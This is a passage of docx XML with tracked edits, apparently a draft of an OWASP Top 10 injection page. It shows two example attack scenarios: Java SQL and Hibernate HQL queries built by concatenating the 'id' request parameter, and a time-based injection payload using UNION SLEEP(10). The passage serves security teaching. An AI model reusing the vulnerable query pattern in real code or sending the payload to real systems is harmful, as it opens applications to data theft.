      <w:del w:id="1279" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5EB9BF9A" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1280" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08AE8924" w14:textId="16F86970" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2ACFCDAC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0111FDAE" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A3DA68C" w14:textId="1DE575B9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1281" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #1</w:t>
      </w:r>
      <w:del w:id="1282" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1283" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> An application uses untrusted data in the construction</w:t>
      </w:r>
      <w:del w:id="1284" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1A2B1464" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>of the following vulnerable SQL call:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E1EA3D" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1285" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01BA02E8" w14:textId="23E3EA32" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1286" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1287" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1288" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="580E2D73" w14:textId="7DCE2EB0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">String query = "SELECT </w:t>
      </w:r>
      <w:del w:id="1289" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1290" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>\*</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> FROM accounts WHERE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>custID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">='" + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>request.getParameter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("id") + "'</w:t>
      </w:r>
      <w:del w:id="1291" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>";`</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1292" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>";</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="32F26897" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1293" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1294" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="18A32673" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4606C917" w14:textId="20A93E23" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1295" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #2</w:t>
      </w:r>
      <w:del w:id="1296" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1297" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Similarly, an application’s blind trust in frameworks</w:t>
      </w:r>
      <w:del w:id="1298" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0D5D63DB" w14:textId="795FA597" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1299" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>may result in queries that are still vulnerable, (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="1300" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1301" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hibernate Query</w:t>
      </w:r>
      <w:del w:id="1302" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="52CC7CA2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Language (HQL)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65609BB9" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1303" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09D635E9" w14:textId="4642EA70" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1304" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1305" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1306" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="79DEE410" w14:textId="1028A98D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1307" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Query </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>HQLQuery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>session.createQuery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">("FROM accounts WHERE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>custID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">='" + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>request.getParameter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("id") + "'</w:t>
      </w:r>
      <w:del w:id="1308" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>");`</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1309" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>");</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76E03165" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1310" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1311" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="11D3EC00" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A117CAB" w14:textId="02FD380E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1312" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>In both cases, the attacker modifies the ‘id’ parameter value in their</w:t>
      </w:r>
      <w:del w:id="1313" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5BE8563B" w14:textId="33BFE7D3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">browser to send: </w:t>
      </w:r>
      <w:del w:id="1314" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">' UNION </w:t>
      </w:r>
      <w:del w:id="1315" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">SELECT </w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SLEEP(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>10);--. For example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642D66A3" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1316" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B40F26B" w14:textId="3CC76504" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1317" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1318" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1319" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="05A0DCAC" w14:textId="487B1036" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1320" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
